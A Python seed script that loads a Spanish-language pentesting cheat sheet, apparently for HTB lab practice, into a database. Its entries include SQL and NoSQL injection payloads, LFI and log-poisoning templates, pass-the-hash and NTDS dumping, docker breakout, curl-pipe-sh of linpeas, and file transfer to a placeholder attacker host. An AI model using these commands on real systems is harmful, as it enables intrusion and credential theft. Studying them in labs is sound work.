from db.models import Entry, Block, Command, Tag, Machine
from db.session import Session, init_db

# Datos de prueba tomados del Arsenal de Notion.
# Convención de comandos:
#   command -> plantilla con marcadores (<IP>, <URL>, <WORDLIST>, ...)
#   example -> versión rellenada de laboratorio (IPs de rango privado)
# Los apuntes más ofensivos (netexec, log poisoning, NoSQLi, docker breakout)
# van como plantilla con marcadores, no como exploit listo para ejecutar.

# Máquinas HTB donde se usó alguna entrada (name único).
MACHINES = {
    "Shoppy": "linux",
    "Tactics": "windows",
}

ENTRIES = [
    {
        "title": "Reconocimiento de directorios web",
        "description": "Fuzzing de rutas y directorios sobre un servicio HTTP.",
        "phase": "Reconocimiento", "os": "multiplataforma",
        "tags": ["gobuster", "nmap", "HTTP"],
        "machines": [],
        "blocks": [
            {"position": 1, "title": "Fuzzing con gobuster", "description": "Diccionario + extensiones.", "commands": [
                {"position": 1, "command": "gobuster dir -u <URL> -w <WORDLIST> -x php,bak,html,txt,old,zip -t 20",
                 "note": "las extensiones .bak/.old/.zip a veces filtran codigo o credenciales",
                 "example": "gobuster dir -u http://votenow.local -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,bak,txt -t 20"},
            ]},
            {"position": 2, "title": "Prefijar el diccionario con el nombre de la maquina", "description": None, "commands": [
                {"position": 1, "command": "sed 's/^/<PREFIJO>/' <WORDLIST> > <OUT>",
                 "note": "cuando un directorio empieza con el nombre de la maquina (/imfadministrator)",
                 "example": "sed 's/^/imf/' directory-list-2.3-medium.txt > imf_dictionary.txt"},
            ]},
            {"position": 3, "title": "Fuzzing con nmap", "description": None, "commands": [
                {"position": 1, "command": "nmap -p 80 --script http-enum <IP>",
                 "note": "http-enum detecta rutas como .git que no traen los diccionarios de SecLists", "example": None},
            ]},
        ],
    },
    {
        "title": "Reconocimiento de subdominios",
        "description": "Enumeracion de virtual hosts fuzzeando el header Host.",
        "phase": "Reconocimiento", "os": "multiplataforma",
        "tags": ["ffuf", "gobuster", "HTTP", "DNS", "vhost"],
        "machines": [],
        "blocks": [
            {"position": 1, "title": "ffuf (FUZZ en el header Host)", "description": "Para virtual hosting.", "commands": [
                {"position": 1, "command": "ffuf -u http://<IP> -w <WORDLIST> -H 'Host: FUZZ.<DOMINIO>' -fs <SIZE>",
                 "note": "-fs filtra por tamano; corre primero sin filtro para ver el tamano por defecto",
                 "example": "ffuf -u http://192.168.1.44 -w directory-list-2.3-medium.txt -H 'Host: FUZZ.votenow.local' -fs 11713"},
            ]},
            {"position": 2, "title": "gobuster (modo vhost)", "description": None, "commands": [
                {"position": 1, "command": "gobuster vhost -u <URL> -w <WORDLIST> -t 20 --append-domain",
                 "note": "si el diccionario de subdominios no halla nada, prueba el de directorios",
                 "example": "gobuster vhost -u http://votenow.local/ -w directory-list-2.3-medium.txt -t 20 --append-domain"},
            ]},
        ],
    },
    {
        "title": "Descubrimiento de hosts y puertos",
        "description": "Barrido de hosts y puertos usando solo bash (/dev/tcp), sin nmap.",
        "phase": "Reconocimiento", "os": "linux",
        "tags": ["bash", "recon"],
        "machines": [],
        "blocks": [
            {"position": 1, "title": "Barrido con /dev/tcp", "description": "Util con ICMP bloqueado o sin nmap tras pivotar.", "commands": [
                {"position": 1,
                 "command": "for i in $(seq 1 254); do for p in 21 22 80 443 445; do timeout 1 bash -c \"echo '' > /dev/tcp/<RED>.$i/$p\" &>/dev/null && echo \"[+] <RED>.$i:$p OPEN\" & done; done; wait",
                 "note": "ajusta <RED> y los puertos; el & y el wait hacen el barrido en paralelo",
                 "example": "for i in $(seq 1 254); do for p in 22 80 445; do timeout 1 bash -c \"echo '' > /dev/tcp/10.10.0.$i/$p\" &>/dev/null && echo \"[+] 10.10.0.$i:$p OPEN\" & done; done; wait"},
            ]},
        ],
    },
    {
        "title": "Enumeracion de MongoDB con mongosh",
        "description": "Conexion y listado de bases y colecciones en MongoDB.",
        "phase": "Enumeración", "os": "multiplataforma",
        "tags": ["MongoDB"],
        "machines": ["Shoppy"],
        "blocks": [
            {"position": 1, "title": "Conectar", "description": "Muchas instalaciones no tienen auth por defecto.", "commands": [
                {"position": 1, "command": "mongosh <IP>:27017", "note": "cliente nuevo; 'mongo' es el antiguo",
                 "example": "mongosh 127.0.0.1:27017"},
            ]},
            {"position": 2, "title": "Enumerar", "description": None, "commands": [
                {"position": 1, "command": "show dbs", "note": "listar bases de datos", "example": None},
                {"position": 2, "command": "use <DB>; show collections", "note": "colecciones = tablas", "example": None},
                {"position": 3, "command": "db.<COL>.find().pretty()", "note": "volcar documentos formateados", "example": "db.users.find().pretty()"},
            ]},
        ],
    },
    {
        "title": "SMB - enumeracion de shares",
        "description": "Listado y acceso a recursos compartidos SMB con smbclient.",
        "phase": "Enumeración", "os": "multiplataforma",
        "tags": ["SMB", "smbclient"],
        "machines": [],
        "blocks": [
            {"position": 1, "title": "Listar shares", "description": None, "commands": [
                {"position": 1, "command": "smbclient -N -L //<IP>", "note": "-N sesion nula (sin credenciales)",
                 "example": "smbclient -N -L //10.129.42.254"},
                {"position": 2, "command": "smbclient -U <USER> //<IP>/<SHARE>", "note": "conectarse a un share con usuario", "example": None},
            ]},
            {"position": 2, "title": "Dentro del prompt smb", "description": "Prompt smb: \\>", "commands": [
                {"position": 1, "command": "ls; get <archivo>; mget *", "note": "mget * baja todo el share", "example": None},
            ]},
        ],
    },
    {
        "title": "netexec - auditoria de SMB/AD",
        "description": "Auditoria de SMB, pass-the-hash y volcado de credenciales de dominio.",
        "phase": "Enumeración", "os": "windows",
        "tags": ["netexec", "SMB", "NTLM", "Active Directory", "impacket"],
        "machines": ["Tactics"],
        "blocks": [
            {"position": 1, "title": "Auditar SMB y listar shares", "description": None, "commands": [
                {"position": 1, "command": "nxc smb <IP> -u <USER> -p <PASSWORD> --shares",
                 "note": "lista shares y permisos", "example": "nxc smb 10.129.103.112 -u Administrator -p '' --shares"},
            ]},
            {"position": 2, "title": "Pass-the-hash y volcado", "description": "Plantillas; requieren credenciales validas.", "commands": [
                {"position": 1, "command": "nxc smb <IP> -u <USER> -H <NTHASH>", "note": "autenticacion por hash NTLM (pass-the-hash)", "example": None},
                {"position": 2, "command": "nxc smb <IP> -u <USER> -p <PASSWORD> --ntds", "note": "vuelca NTDS; requiere privilegios de dominio", "example": None},
            ]},
            {"position": 3, "title": "Shell con impacket (psexec)", "description": None, "commands": [
                {"position": 1, "command": "impacket-psexec <USER>@<IP>", "note": "sube un servicio al share ADMIN$ -> shell SYSTEM; ruidoso, solo labs",
                 "example": "impacket-psexec administrator@10.129.103.112"},
            ]},
        ],
    },
    {
        "title": "WordPress - enumeracion y rutas criticas",
        "description": "Enumeracion de usuarios, plugins y rutas sensibles en WordPress.",
        "phase": "Explotación", "os": "multiplataforma",
        "tags": ["wpscan", "gobuster", "HTTP", "WordPress"],
        "machines": [],
        "blocks": [
            {"position": 1, "title": "Confirmar y enumerar rapido (curl)", "description": None, "commands": [
                {"position": 1, "command": "curl -s <URL> | grep wp-content", "note": "confirmar que es WordPress", "example": None},
                {"position": 2, "command": "curl <URL>/wp-json/wp/v2/users", "note": "enumera usuarios via API REST (casi siempre funciona)", "example": None},
            ]},
            {"position": 2, "title": "wpscan", "description": None, "commands": [
                {"position": 1, "command": "wpscan --url <URL> -e ap,at,u,cb,dbe --api-token <TOKEN>",
                 "note": "ap plugins, u usuarios, cb config backups, dbe db exports",
                 "example": "wpscan --url http://wordpress.aragog.hogwarts/blog -e vp,u --api-token TOKEN"},
            ]},
            {"position": 3, "title": "Rutas criticas", "description": None, "commands": [
                {"position": 1, "command": "<URL>/wp-config.php.bak", "note": "variantes ~ .old .save: credenciales de BD en texto plano", "example": None},
            ]},
        ],
    },
    {
        "title": "LFI - Local File Inclusion",
        "description": "Inclusion de archivos locales a traves de parametros vulnerables.",
        "phase": "Explotación", "os": "linux",
        "tags": ["ffuf", "HTTP", "LFI"],
        "machines": [],
        "blocks": [
            {"position": 1, "title": "Fuzzear el parametro vulnerable", "description": None, "commands": [
                {"position": 1, "command": "ffuf -u http://<IP>/index.php?FUZZ=/etc/passwd -w <WORDLIST> -fs <SIZE>",
                 "note": "-fs filtra el tamano de la respuesta normal", "example": None},
            ]},
            {"position": 2, "title": "Rutas clasicas a probar", "description": "Solo lectura; para RCE ver Log Poisoning.", "commands": [
                {"position": 1, "command": "../../../../../../etc/passwd", "note": "lectura de archivos", "example": None},
                {"position": 2, "command": "../../../../../../home/<USER>/.ssh/id_rsa", "note": "llave privada SSH", "example": None},
                {"position": 3, "command": "../../../../../../var/log/apache2/access.log", "note": "vector de log poisoning", "example": None},
            ]},
        ],
    },
    {
        "title": "Log Poisoning (LFI a RCE)",
        "description": "Escalada de LFI a ejecucion de codigo envenenando logs. Plantilla.",
        "phase": "Explotación", "os": "linux",
        "tags": ["LFI", "RCE", "HTTP"],
        "machines": [],
        "blocks": [
            {"position": 1, "title": "Envenenar el log", "description": "Plantilla; inyecta PHP en una cabecera que queda escrita en el log.", "commands": [
                {"position": 1, "command": "curl -s http://<HOST>/ -A '<PAYLOAD_PHP>'",
                 "note": "el User-Agent queda escrito en access.log", "example": None},
            ]},
            {"position": 2, "title": "Incluir el log via LFI", "description": None, "commands": [
                {"position": 1, "command": "http://<HOST>/index.php?page=<RUTA_LOG>&<PARAM>=<COMANDO>",
                 "note": "al incluir el log, el PHP inyectado se ejecuta", "example": None},
            ]},
        ],
    },
    {
        "title": "NoSQL Injection (MongoDB)",
        "description": "Bypass de autenticacion en MongoDB. Plantilla.",
        "phase": "Explotación", "os": "multiplataforma",
        "tags": ["MongoDB", "NoSQL Injection", "HTTP"],
        "machines": ["Shoppy"],
        "blocks": [
            {"position": 1, "title": "Bypass de autenticacion", "description": "Operadores de MongoDB en los parametros del login.", "commands": [
                {"position": 1, "command": "username[$ne]=<X>&password[$ne]=<Y>", "note": "operador $ne (not equal) para saltar el login", "example": None},
                {"position": 2, "command": '{"username": {"$ne": null}, "password": {"$ne": null}}', "note": "variante en body JSON", "example": None},
            ]},
        ],
    },
    {
        "title": "SQLi MySQL - enumeracion por UNION",
        "description": "Extraccion de datos mediante inyeccion SQL basada en UNION.",
        "phase": "Explotación", "os": "multiplataforma",
        "tags": ["MySQL", "SQL Injection", "HTTP"],
        "machines": [],
        "blocks": [
            {"position": 1, "title": "Determinar numero de columnas", "description": None, "commands": [
                {"position": 1, "command": "' ORDER BY <N>-- -", "note": "sube N hasta que falle", "example": "' ORDER BY 5-- -"},
            ]},
            {"position": 2, "title": "UNION y enumeracion", "description": None, "commands": [
                {"position": 1, "command": "' UNION SELECT group_concat(schema_name) FROM information_schema.schemata-- -",
                 "note": "todas las bases de datos en una fila", "example": None},
                {"position": 2, "command": "' UNION SELECT group_concat(username,0x3a,password) FROM <DB>.users-- -",
                 "note": "0x3a es ':' en hex, separa campos", "example": None},
            ]},
        ],
    },
    {
        "title": "Estabilizar una shell",
        "description": "Tratamiento de la TTY para obtener una shell interactiva.",
        "phase": "Post-Explotación", "os": "linux",
        "tags": ["shell", "TTY"],
        "machines": [],
        "blocks": [
            {"position": 1, "title": "Tratamiento de la TTY", "description": None, "commands": [
                {"position": 1, "command": "script /dev/null -c bash", "note": "paso 1, en la victima", "example": None},
                {"position": 2, "command": "stty raw -echo; fg", "note": "paso 3, en tu maquina tras Ctrl+Z", "example": None},
                {"position": 3, "command": "export TERM=xterm; stty rows <R> columns <C>", "note": "ajusta el tamano; saca valores con 'stty size'", "example": None},
            ]},
            {"position": 2, "title": "Alternativa rapida", "description": None, "commands": [
                {"position": 1, "command": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", "note": "TTY inicial rapida", "example": None},
            ]},
        ],
    },
    {
        "title": "Transferencia de archivos",
        "description": "Mover archivos entre la maquina atacante y la victima.",
        "phase": "Post-Explotación", "os": "linux",
        "tags": ["netcat", "scp", "chisel"],
        "machines": [],
        "blocks": [
            {"position": 1, "title": "Servir con Python y descargar", "description": None, "commands": [
                {"position": 1, "command": "python3 -m http.server 80", "note": "en el atacante", "example": None},
                {"position": 2, "command": "wget http://<ATACANTE>/<FILE> -O /tmp/<FILE>", "note": "en la victima", "example": None},
            ]},
            {"position": 2, "title": "Con netcat", "description": None, "commands": [
                {"position": 1, "command": "nc -nlvp 443 > <FILE>", "note": "atacante (recibe)", "example": None},
                {"position": 2, "command": "cat < /dev/tcp/<ATACANTE>/443 > <FILE>", "note": "victima (envia)", "example": None},
            ]},
            {"position": 3, "title": "scp (si hay acceso SSH)", "description": None, "commands": [
                {"position": 1, "command": "scp <USER>@<IP>:<RUTA> .", "note": "baja un binario para analizar en tu maquina", "example": None},
            ]},
        ],
    },
    {
        "title": "Cracking de hashes y llaves",
        "description": "Recuperacion de contrasenas y passphrases con john y hashcat.",
        "phase": "Post-Explotación", "os": "linux",
        "tags": ["john", "hashcat"],
        "machines": [],
        "blocks": [
            {"position": 1, "title": "Passphrase de una llave SSH", "description": None, "commands": [
                {"position": 1, "command": "python3 /usr/share/john/ssh2john.py <KEY> > <KEY>.hash", "note": "convierte la llave en un hash atacable", "example": None},
                {"position": 2, "command": "john --wordlist=/usr/share/wordlists/rockyou.txt <KEY>.hash", "note": None, "example": None},
            ]},
            {"position": 2, "title": "hashcat", "description": None, "commands": [
                {"position": 1, "command": "hashcat -a 0 -m <MODO> <HASH_FILE> /usr/share/wordlists/rockyou.txt",
                 "note": "-m 0=MD5, 100=SHA1, 1000=NTLM, 3200=bcrypt; identifica con hashid", "example": None},
            ]},
        ],
    },
    {
        "title": "Privesc Linux - enumeracion local",
        "description": "Checklist manual: config, SUID, sudo, capabilities, cron.",
        "phase": "Privesc", "os": "linux",
        "tags": ["SUID", "sudo", "cron", "capabilities"],
        "machines": [],
        "blocks": [
            {"position": 1, "title": "Config con credenciales", "description": None, "commands": [
                {"position": 1, "command": "grep -r -i 'password' -l", "note": "en /var/www/html: archivos con la palabra password", "example": None},
                {"position": 2, "command": "find / -name '*config*' 2>/dev/null", "note": None, "example": None},
            ]},
            {"position": 2, "title": "SUID / sudo / capabilities", "description": None, "commands": [
                {"position": 1, "command": "find / -perm -4000 2>/dev/null", "note": "binarios SUID -> cruzar con GTFOBins", "example": None},
                {"position": 2, "command": "sudo -l", "note": "que puedo ejecutar como sudo", "example": None},
                {"position": 3, "command": "getcap -r / 2>/dev/null", "note": "capabilities (cap_setuid, cap_dac_read_search...)", "example": None},
            ]},
            {"position": 3, "title": "Cron", "description": None, "commands": [
                {"position": 1, "command": "cat /etc/crontab; ls -la /etc/cron.*", "note": None, "example": None},
            ]},
        ],
    },
    {
        "title": "linPEAS - enumeracion automatizada",
        "description": "Enumeracion automatica de vectores de privesc en Linux.",
        "phase": "Privesc", "os": "linux",
        "tags": ["privesc", "enumeracion"],
        "machines": [],
        "blocks": [
            {"position": 1, "title": "Ejecutar linPEAS", "description": "Correlo despues de tu enumeracion manual, no antes.", "commands": [
                {"position": 1, "command": "curl -L <URL_LINPEAS> | sh", "note": "si la victima tiene salida a internet",
                 "example": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"},
                {"position": 2, "command": "./linpeas.sh", "note": "si lo transfieres primero", "example": None},
            ]},
        ],
    },
    {
        "title": "Docker Breakout via grupo docker",
        "description": "Escalada a root abusando de la pertenencia al grupo docker. Plantilla.",
        "phase": "Privesc", "os": "linux",
        "tags": ["Docker", "Docker Breakout"],
        "machines": ["Shoppy"],
        "blocks": [
            {"position": 1, "title": "Comprobar pertenencia al grupo", "description": None, "commands": [
                {"position": 1, "command": "id", "note": "si apareces en el grupo 'docker' puedes montar el FS del host", "example": None},
            ]},
            {"position": 2, "title": "Montar el sistema de archivos del host", "description": "Plantilla.", "commands": [
                {"position": 1, "command": "docker run -v /:/mnt --rm -it <IMAGEN> chroot /mnt sh",
                 "note": "monta / del host en el contenedor -> acceso root en el host",
                 "example": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
            ]},
        ],
    },
    {
        "title": "SSH Tunneling",
        "description": "Port forwarding local/remoto y proxy dinamico sobre SSH.",
        "phase": "Pivoting", "os": "linux",
        "tags": ["proxychains", "SSH", "pivoting", "port-forwarding"],
        "machines": [],
        "blocks": [
            {"position": 1, "title": "Local port forwarding", "description": "Un puerto especifico via el pivote.", "commands": [
                {"position": 1, "command": "ssh -L <LPORT>:<DEST>:<DPORT> <USER>@<PIVOT>",
                 "note": "accedes en localhost:<LPORT>", "example": "ssh -L 8080:maquina_B:80 user@maquina_A"},
            ]},
            {"position": 2, "title": "Dynamic port forwarding (SOCKS) + proxychains", "description": None, "commands": [
                {"position": 1, "command": "ssh -D 1080 <USER>@<PIVOT>", "note": "crea el proxy SOCKS", "example": None},
                {"position": 2, "command": "proxychains nmap -sT -Pn <DEST>", "note": "-sT -Pn obligatorio por SOCKS (no soporta paquetes RAW)", "example": None},
            ]},
        ],
    },
]


def main():
    init_db()
    with Session.begin() as session:
        machines = {name: Machine(name=name, os=os_) for name, os_ in MACHINES.items()}
        session.add_all(machines.values())
        tags = {}  # cache name -> Tag, para reutilizar (M:N) y no duplicar

        for data in ENTRIES:
            entry = Entry(
                title=data["title"], description=data["description"],
                phase=data["phase"], os=data["os"],
            )
            for b in data["blocks"]:
                block = Block(position=b["position"], title=b["title"], description=b["description"])
                for c in b["commands"]:
                    block.commands.append(Command(
                        position=c["position"], command=c["command"],
                        note=c["note"], example=c["example"],
                    ))
                entry.blocks.append(block)
            for tname in data["tags"]:
                entry.tags.append(tags.setdefault(tname, Tag(name=tname)))
            for mname in data["machines"]:
                entry.machines.append(machines[mname])
            session.add(entry)


if __name__ == "__main__":
    main()
